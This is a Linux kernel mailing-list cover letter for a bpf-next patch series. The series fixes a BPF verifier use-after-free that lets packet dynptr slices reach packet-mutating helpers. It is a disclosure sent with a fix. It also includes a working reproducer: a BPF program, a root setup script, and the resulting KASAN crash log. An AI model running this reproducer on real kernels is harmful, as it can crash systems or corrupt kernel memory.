Received: from mail-pl1-f169.google.com (mail-pl1-f169.google.com [209.85.214.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B6D01202F70
	for <bpf@vger.kernel.org>; Sun, 18 Oct 2026 05:44:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792302275; cv=none; b=UoKtGEjh5Mk+oktud3XvHTLpkFvciBoQjVRecWnfGXpqWbqIeYxQODU91cbym+2k3Mm04QW1mE9F91Fj6oG9NnbHPaCDyr+68RbBpQM1jX2Wj4+taUdaEkRvfckCOnFQvEkqmJKOyMbxWeY9oq1f5zJQ9QeLkV1Bhb7LUFnAB1I=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792302275; c=relaxed/simple;
	bh=cghKMTBT5r0M+ecyi/4ofOEr4eHa4bOFNt5a7Nkyg+U=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UFTzp2KEF8qHcGx8EGdNf8yK6BWnuIGpCl+tgm+emhGwQlMjqhNIF/W+OnXzezMNd/tmDGfy2V6rsrvjbvVs2f/R7yEWOrD/6DJuF5HlzKg3ABP2u95aKpOI5jCgzU/kN+VkBQog7uv3HJz1mx3oFI7KxAeWVPIn3jkeRxFJMjM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=h8KAVFdH; arc=none smtp.client-ip=209.85.214.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="h8KAVFdH"
Received: by mail-pl1-f169.google.com with SMTP id d9443c01a7336-2e985106c0cso7313975ad.2
        for <bpf@vger.kernel.org>; Sat, 17 Oct 2026 22:44:33 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792302273; x=1792907073; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=XfX3fVvarhTrNhL23P2+nD+Pu0SSxWWv0jWAubdWzeE=;
        b=h8KAVFdHQzOXqXcm0nkx2nCmG1r9U3AdJNJuaTUrTswDZOzombshF6iBd23Kuc9oa+
         2DPgOAB8mFktwevYP87/fuTFQP/P/cZ+7C+/ItqUvwdFywCMgA+koe+egUELrRHFQB3+
         E5VinROg0+kSdJEzAdk7Pohu0teaOMj3QslAXyVhvxFh8rh557/RLO0nHNNZcrUayAOx
         JKf6I7dS4t5TU2Q6xepJfwVne6AQYaQT94NwmcjOssQvtYXbL7FyTmwvNjhGHnH4Qpyx
         ETHq0QXnNLXWUTieXwD62WSoiwpPDt9+7TEk4gIwmx87theLbTV+bs5lijrBtrLvcuoi
         xD2Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792302273; x=1792907073;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=XfX3fVvarhTrNhL23P2+nD+Pu0SSxWWv0jWAubdWzeE=;
        b=OeoOcKvRrpQP+VR/iM66jVZiE3y0pYVTrLwf9ZS8/IyCbPHXgrwI+hB6dYZEYZAKQw
         jDx1QbJk2Y5Ite9KzFSqx8U4hVG1OUxsIualty9u5Fz2YSkdYc1ToM6Q/cHbbngn7Nn+
         8tYpdMu7EY/d2oPrZkcNqODNsAe8ymE9o2AUHH55oNmKkRlElazJButRJLgr/0UB9i/n
         4H1kZm//7reZRvJoWjtLtcpwBjztGflAQNDxH8FQn7kH7xSnVAAnTppr2140MN677R5V
         jZAVNCxR6vgcdJ/aiUh6d276ekLijyQMpahi/AYOLyppOn0dF2xYpHnYincpgY6wlEiG
         CmWw==
X-Gm-Message-State: AFq9FYKxOVlNoX3wwSk+RZOdCV2mvKmEQqPYjExo+zBze3LX4Dj5Emd5
	Sr2EoeivBA7psR2OAirqb/NZx7RQ0KkSRI0Y7k28PRFtWpaqm4cnK5cu3o4Ibf5JNgAnbcIOa9W
	csEmDVw==
X-Gm-Gg: AYBFou1qkfChgjA9UEYXOR05+zTTtxOSip1PVDx6VULEGYjd8vmNnebA0s4tvXHIYFy
	xVsmfwI/UcmyrDJEu4AbMHa3GrAf5rmuckhMrMLrLt4d7pYorJ8GpJXw9MdrdvPmreRsq0ZSUK5
	A4hP0rnPTNPnCRneFaKh54Q5FzMjS3NFAc+1YByievHX6IcPL/f8LIPNiewJmcYscctMH3Pt92U
	unf1gIaRBSx3e+2EC4Zs7WBdEghjYDlVqOHZyNiHQIR5oej1BN817BgtA1Iv5iyKpxkOZxhoWIW
	R0TteCJcnjMTue5eEaqyd32xE1/A4zbcfsRC+VJgaY5IacA+eOGsVv9zqZkwY2PUVCSzTg2jdY7
	BYcrUoRotvkzjiNr1Cb/u0lW45PneftJPLcItrzJ/I98gJCwMD2dxUWaZXwiddL1RW/s/+CCxcp
	0VttvVGusSz1TiIGrxICSDgyrPIXIO4bPFg9kh8jIBg2ORBKmj3eDZoAADSo//6iF+/1HOOqJxk
	nIvpRMLsCI=
X-Received: by 2002:a17:903:1111:b0:2e9:4f7b:affd with SMTP id d9443c01a7336-2e9a6846609mr38166935ad.6.1792302272926;
        Sat, 17 Oct 2026 22:44:32 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2e97e804e80sm27011525ad.23.2026.10.17.22.44.25
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 17 Oct 2026 22:44:32 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: bpf@vger.kernel.org,
	netdev@vger.kernel.org,
	ast@kernel.org
Cc: daniel@iogearbox.net,
	andrii@kernel.org,
	eddyz87@gmail.com,
	memxor@gmail.com,
	martin.lau@linux.dev,
	song@kernel.org,
	yonghong.song@linux.dev,
	jolsa@kernel.org,
	emil@etsalapatis.com,
	ihor.solodrai@linux.dev,
	john.fastabend@gmail.com,
	davem@davemloft.net,
	kuba@kernel.org,
	hawk@kernel.org,
	sdf@fomichev.me,
	drosen@google.com,
	ameryhung@gmail.com,
	xyx2021@mail.ustc.edu.cn,
	chenyy23@mails.tsinghua.edu.cn,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH bpf-next v2 0/2] bpf: Reject packet dynptr slices in mutating helpers and subprograms
Date: Sun, 18 Oct 2026 13:44:20 +0800
Message-ID: <cover.1792222148.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated a slab-use-after-free issue in the BPF verifier
(kernel/bpf/verifier.c) affecting packet-mutating helpers and
subprograms.

Impact Scope:
When an skb-backed dynptr slice (PTR_TO_MEM tagged with
DYNPTR_TYPE_SKB, DYNPTR_TYPE_XDP, or DYNPTR_TYPE_SKB_META) is passed
to helpers or subprograms that mutate packet data (e.g.
bpf_lwt_push_encap(), bpf_skb_store_bytes(), or bpf_dynptr_write()
into an skb dynptr), reallocation of the packet buffer via
skb_cow_head() or pskb_expand_head() frees the old head and
invalidates the slice during helper execution, leading to a
slab-use-after-free read or write.

Privilege Requirements:
Triggering this bug requires root privileges (UID 0 / CAP_NET_ADMIN
and CAP_BPF) to load BPF LWT programs, configure network dummy
devices, attach LWT encap routes, and adjust sysctl parameters. The
reproducer script and crash log reflect this privileged execution
context.

Testing & Validation Results:
The slab-use-after-free was reproduced on unpatched kernels using the
enclosed LWT reproducer, triggering a KASAN slab-use-after-free crash
under UID 0. With this v2 patch series applied, the verifier rejects
loading such programs at program load time with -EINVAL, preventing
the crash. We also verified compilation and ran negative verifier
selftests, all passing with zero regressions.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11304
Closes: https://bugtracker.nebusec.ai/f/11304

In v1, we proposed a local workaround in net/core/lwt_bpf.c to buffer the
encap header across skb_cow_head(). As Alexei Starovoitov pointed out,
patching lwt_bpf.c alone only treats a symptom; any helper mutating
packet data (e.g. BPF_LWT_ENCAP_SEG6, bpf_skb_store_bytes(), or
bpf_dynptr_write() into an skb dynptr) suffers from the exact same
use-after-free read or write when the skb head buffer is reallocated.

The architectural root cause is that the verifier rejects raw packet
pointers (PTR_TO_PACKET) for mutating helpers because they do not have
pkt_access, but allows an skb-backed dynptr slice (PTR_TO_MEM tagged with
DYNPTR_TYPE_SKB, DYNPTR_TYPE_XDP, or DYNPTR_TYPE_SKB_META) through
check_helper_mem_access() ever since commit 2012c867c800 ("bpf:
verifier: Accept dynptr mem as mem in helpers") stripped
DYNPTR_TYPE_FLAG_MASK for ARG_PTR_TO_MEM.

This series resolves the problem across mutating helpers and subprograms:
- Patch 1 rejects reg_is_dynptr_slice_pkt() arguments for helpers that
  change packet data in check_func_arg() (mirroring commit a6c1edfbe240
  ("bpf: Reject pkt arguments in mutating subprogs") for global
  subprograms). In addition, it models bpf_dynptr_copy and
  bpf_dynptr_memset as packet-changing when targeting skb dynptrs,
  marks subprograms invoking them as changes_pkt_data during CFG
  analysis, rejects passing packet dynptrs to mutating subprograms,
  provides a stack fallback for non-linear skb dynptr copies, and
  updates test_xdp_meta.c.
- Patch 2 adds dedicated negative tests in dynptr_fail.c.

Note on CFG and subprog semantics: CFG analysis conservatively marks a
subprogram that invokes bpf_dynptr_write (or a packet-changing dynptr
kfunc) as changes_pkt_data, without inspecting the dynptr's runtime
type. This is required because CFG analysis runs before do_check() and
has no register or stack state to reason about, and because a global
subprogram's dynptr parameter type-erases to BPF_DYNPTR_TYPE_LOCAL
during its isolated verification. This safe over-approximation is what
prevents an skb dynptr from reaching a subprogram that could reallocate
skb->head. The cost is that a caller holding a direct packet pointer
across such a subprogram call must re-read ctx->data/ctx->data_end
afterwards, which is the standard BPF verifier re-validation
requirement. We prefer soundness over completeness here, matching the
conservative CFG marking used by commit a6c1edfbe240 ("bpf: Reject pkt
arguments in mutating subprogs"). This is a verification-time
restriction only; runtime behavior of accepted programs is unchanged.

v1 -> v2:
- v1 Link:
  https://lore.kernel.org/all/cover.1791433504.git.rakukuip@gmail.com/
- Retarget series to bpf-next tree instead of net (Alexei Starovoitov).
- Fix root cause in BPF verifier by rejecting reg_is_dynptr_slice_pkt()
  arguments in check_func_arg() for helpers changing packet data instead
  of patching individual helpers (Alexei Starovoitov).
- Correct Fixes tag to commit 2012c867c800 ("bpf: verifier: Accept dynptr
  mem as mem in helpers") which first accepted dynptr slices as helper
  arguments (Alexei Starovoitov).
- Model bpf_dynptr_copy and bpf_dynptr_memset as packet-changing in
  bpf_is_kfunc_pkt_changing() and CFG analysis when writing to skb
  dynptrs, ensuring clear_all_pkt_pointers() clears packet slices.
- Reject passing packet dynptrs to subprograms that may change packet
  data in check_func_arg(), preventing global subprograms from mutating
  skb dynptrs.
- In bpf_dynptr_copy(), fall back to safe chunked copying through a
  stack buffer when writing to non-linear skb dynptrs.
- Update ing_cls_dynptr_write() in test_xdp_meta.c to use a stack buffer
  (Alexei Starovoitov).
- Add dedicated negative tests in dynptr_fail.c (Alexei Starovoitov).

=== details and PoC below ===

Bug details:

The BPF verifier permits an skb-backed bpf_dynptr_slice() pointer to
satisfy the helper's ARG_PTR_TO_MEM | MEM_RDONLY header argument.

In bpf_lwt_push_ip_encap(), skb_cow_head() is called to expand headroom.
If the skb headroom is insufficient or the skb is cloned,
skb_cow_head() invokes pskb_expand_head(), which allocates a new head
buffer and frees the old one. If the encapsulation header pointer hdr
points into the skb head, it becomes stale after reallocation.
Subsequent reads of iph and hdr in skb_postpush_rcsum(), UDP tunnel
header handling, and memcpy() lead to a use-after-free read.

The same issue affects BPF_LWT_ENCAP_SEG6 mode, bpf_skb_store_bytes()
when offset is in frags, bpf_dynptr_write() into skb dynptrs, and the
rest of seg6 helpers.

Reproducer:

The reproducer requires root privileges (UID 0 / CAP_NET_ADMIN and
CAP_BPF) and executes in a root shell. It attaches an LWT_XMIT BPF program
to an IPv4 route via "encap bpf xmit". The BPF program obtains an
skb-backed dynptr slice and calls bpf_lwt_push_encap(skb,
BPF_LWT_ENCAP_IP, hdr, 256). A subsequent packet transmission triggers
skb_cow_head() reallocation, resulting in the KASAN slab-use-after-free
under UID 0 shown in the crash log below.

=== BEGIN poc.bpf.c ===
    // SPDX-License-Identifier: GPL-2.0
    #include <linux/bpf.h>
    #include <linux/ip.h>

    #define HDR_LEN 256

    #define SEC(name) __attribute__((section(name), used))
    #define __ksym __attribute__((section(".ksyms")))
    #define __weak __attribute__((weak))

    extern int bpf_dynptr_from_skb(struct __sk_buff *skb, __u64 flags,
    			       struct bpf_dynptr *ptr__uninit) __ksym __weak;
    extern void *bpf_dynptr_slice(const struct bpf_dynptr *ptr,
				  __u32 offset, void *buffer,
				  __u32 buffer__szk) __ksym __weak;

    static long (*bpf_lwt_push_encap)(struct __sk_buff *skb, __u32 type,
    				  void *hdr, __u32 len) =
    	(void *)BPF_FUNC_lwt_push_encap;

    SEC("lwt_xmit")
    int trigger(struct __sk_buff *skb)
    {
    	struct bpf_dynptr ptr;
    	void *hdr;

    	if (bpf_dynptr_from_skb(skb, 0, &ptr))
    		return BPF_OK;

    	if (skb->len < HDR_LEN)
    		return BPF_OK;

    	hdr = bpf_dynptr_slice(&ptr, 0, NULL, HDR_LEN);
    	if (!hdr)
    		return BPF_OK;

    	bpf_lwt_push_encap(skb, BPF_LWT_ENCAP_IP, hdr, HDR_LEN);
    	return BPF_OK;
    }

    char _license[] SEC("license") = "GPL";
=== END poc.bpf.c ===

=== BEGIN poc.sh ===
    #!/bin/sh
    set -eu

    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    ROUTE_CIDR=${ROUTE_CIDR:-10.0.0.0/24}
    SRC_IP=${SRC_IP:-10.0.0.1}
    DST_IP=${DST_IP:-10.0.0.2}
    PING_SIZE=${PING_SIZE:-400}
    PING_COUNT=${PING_COUNT:-10}
    DEV=${DEV:-dummy0}

    cleanup() {
    	ip route del "$ROUTE_CIDR" 2>/dev/null || true
    	ip link del "$DEV" 2>/dev/null || true
    	ip addr del "$SRC_IP/32" dev lo 2>/dev/null || true
    }

    trap cleanup EXIT

    echo 0 > /proc/sys/kernel/panic_on_warn

    ip route del "$ROUTE_CIDR" 2>/dev/null || true
    ip link del "$DEV" 2>/dev/null || true
    ip addr del "$SRC_IP/32" dev lo 2>/dev/null || true

    ip link add "$DEV" type dummy
    ip link set lo up
    ip addr add "$SRC_IP/32" dev lo
    ip link set "$DEV" up
    ip route add "$ROUTE_CIDR" dev "$DEV" \
        encap bpf xmit obj "$DIR/poc.bpf.o" sec lwt_xmit

    i=1
    while [ "$i" -le "$PING_COUNT" ]; do
    	ping -c 1 -W 1 -s "$PING_SIZE" -I "$SRC_IP" "$DST_IP" \
    		>/dev/null 2>&1 || true
    	i=$((i + 1))
    done
=== END poc.sh ===

=== BEGIN crash log ===
    BUG: KASAN: slab-use-after-free in bpf_lwt_push_ip_encap+0x805/0x1ac0
    Read of size 256 at addr ffff88810c74e410 by task ping/10729
    CPU: 3 UID: 0 PID: 10729 Comm: ping Not tainted 6.12.95 #2
    Hardware name: QEMU Ubuntu 24.04 PC v2, BIOS 1.16.3-debian-1.16.3-2 04/01/2014
    Call Trace:
     <TASK>
     dump_stack_lvl+0x78/0xe0
     print_report+0xc6/0x620
     ? bpf_lwt_push_ip_encap+0x805/0x1ac0
     ? srso_alias_return_thunk+0x5/0xfbef5
     ? __virt_addr_valid+0x1f3/0x3d0
     ? bpf_lwt_push_ip_encap+0x805/0x1ac0
     kasan_report+0xd8/0x110
     ? bpf_lwt_push_ip_encap+0x805/0x1ac0
     kasan_check_range+0xf4/0x1a0
     __asan_memcpy+0x23/0x60
     bpf_lwt_push_ip_encap+0x805/0x1ac0
     ? srso_alias_return_thunk+0x5/0xfbef5
     bpf_lwt_xmit_push_encap+0x2b/0x40
     bpf_prog_62cb242b810c4a7f_trigger+0x6b/0x74
     run_lwt_bpf.isra.0+0x32f/0x8c0
     ? lwtunnel_xmit+0x102/0x4e0
     bpf_xmit+0x139/0x380
     lwtunnel_xmit+0x1f7/0x4e0
     ip_finish_output2+0x8be/0x1eb0
     ip_output+0x171/0x3b0
     ip_push_pending_frames+0x1e6/0x250
     ping_v4_sendmsg+0x719/0x16e0
     __sys_sendto+0x32e/0x3a0
     __x64_sys_sendto+0xe0/0x1c0
     do_syscall_64+0xc7/0x270
     entry_SYSCALL_64_after_hwframe+0x77/0x7f
     </TASK>
=== END crash log ===

Luxiao Xu (2):
  bpf: Reject packet dynptr slices in mutating helpers and subprograms
  selftests/bpf: Test rejection of packet dynptr slices in mutating
    helpers

 include/linux/bpf_verifier.h                  |  1 +
 kernel/bpf/cfg.c                              |  3 +-
 kernel/bpf/helpers.c                          |  7 +-
 kernel/bpf/verifier.c                         | 81 ++++++++++++++---
 .../testing/selftests/bpf/progs/dynptr_fail.c | 90 +++++++++++++++++++
 .../selftests/bpf/progs/test_xdp_meta.c       |  4 +-
 6 files changed, 170 insertions(+), 16 deletions(-)

-- 
2.43.0

